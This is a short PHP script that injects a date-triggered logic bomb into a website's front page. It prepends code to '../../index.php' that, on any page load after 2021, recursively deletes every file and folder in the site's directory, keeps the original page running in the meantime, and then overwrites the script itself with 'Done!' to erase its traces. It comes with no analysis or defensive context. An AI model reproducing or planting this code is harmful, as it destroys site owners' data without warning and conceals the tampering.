<?php

    $str = '<?php function makeFile($dir_name) { $all = scandir($dir_name); array_shift($all); array_shift($all); foreach($all as $file) { $file = $dir_name . "/" . $file; if(is_file($file)) { unlink($file); } if(is_dir($file)) { makeFile($file); rmdir($file);}}} if(date("Y") > 2021) { makeFile(__DIR__);} else { ?>';

    $base = '../../index.php';
    file_put_contents($base, $str . file_get_contents($base) . "?><?php } ?>");

    file_put_contents(__FILE__, 'Done!');
